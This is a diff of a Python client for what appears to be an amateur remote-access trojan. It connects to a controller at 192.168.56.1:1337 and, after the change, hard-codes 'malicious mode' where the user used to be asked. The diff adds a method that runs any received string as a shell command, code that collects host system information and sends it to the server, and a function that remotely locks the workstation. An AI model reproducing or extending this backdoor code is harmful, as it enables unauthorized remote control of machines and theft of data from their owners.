@@ -1,14 +1,11 @@
-
 import os
+import platform
 import socket
 import subprocess
 import sys
 import time
-from zipfile import ZipFile
-import platform
-# from mss import mss
 from pprint import pprint
-import json
+
 
 class Client:
     def __init__(self, server_ip, port, buffer_size, client_ip):
@@ -32,14 +29,14 @@ class Client:
             # todo
             print("Pairing Failed")
             self.client.send("MISMATCH".encode("utf-8"))
-            self.close()
+            self.client.close()
 
         else:
             print("KEYS MATCHED - PAIRING SUCCESSFUL")
             self.client.send("MATCH".encode("utf-8"))
 
     def progress(self):
-        malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
+        malorgood = "1"  #input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
         if malorgood == "1":
             print("Malicious mode enabled: ")
             self.client.send("1".encode("utf-8"))
@@ -50,6 +47,14 @@ class Client:
         while True:
             input("Success - Reached the code loop")
             self.sendHostInfo()
+    def runrun(self, msg):
+        obj = "failed"
+        try:
+            obj, _ = subprocess.run(msg, check=True, shell=True)
+            # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
+        except Exception as e:
+            print("This failed too (runrun) : " + str(e) + " + " + str(obj))
+
 
     def sendHostInfo(self):
         """ Extracting host information """
@@ -81,14 +86,6 @@ class Client:
         machine = platform.machine()
 
         with open('./logs/info.txt', 'w+') as f:
-            #Pickle
-            # str(dict)
-            #with open('myfile.txt', 'w') as f:
-                #print(mydictionary, file=f)
-            # f.writelines(["CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n'])
-           #  for line in sys_info:
-           #     f.writelines(str(line))
-            #f.write(json.dumps(sys_info))
             for k, v in sys_info.items():
                 f.write(str(k) + ' >>> ' + str(v) + '\n\n')
 
@@ -109,10 +106,18 @@ class Client:
         # arrange the string into clear info
         for item in Id:
             new.append(str(item.split("\r")[:-1]))
-        with open("./logs/Testprint.txt", "w+") as f:
+        with open("./logs/moreinfoC.txt", "w+") as f:
             for i in new:
                 print(i[2:-2])
                 f.write(i[2:-2] + "\n")
+        with open('./logs/moreinfoC.txt', 'rb+') as f:
+            #self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode())
+            c = f.read()
+            print(len(c))
+            time.sleep(1)
+            self.client.send((str(len(c))).encode())
+            time.sleep(10)
+            self.client.send(c)
 
 
     def sysinfViaCMD(self):
@@ -127,6 +132,16 @@ class Client:
             print(i[2:-2])
 
 
+
+    def locksystem(self):
+        ## command = "-locksystem"
+        ## self.client.send(command.encode("utf-8"))
+        try:
+            msg = "rundll32.exe user32.dll, LockWorkStation"
+            self.runrun(msg)
+            self.client.send("[+] PC Locked".encode("utf-8"))
+        except:
+            self.client.send("[!] LOCKING FAILED".encode("utf-8"))
 def main():
     SERVER_IP = "192.168.56.1"  # modify me
     PORT = 1337  # modify me (if you want)
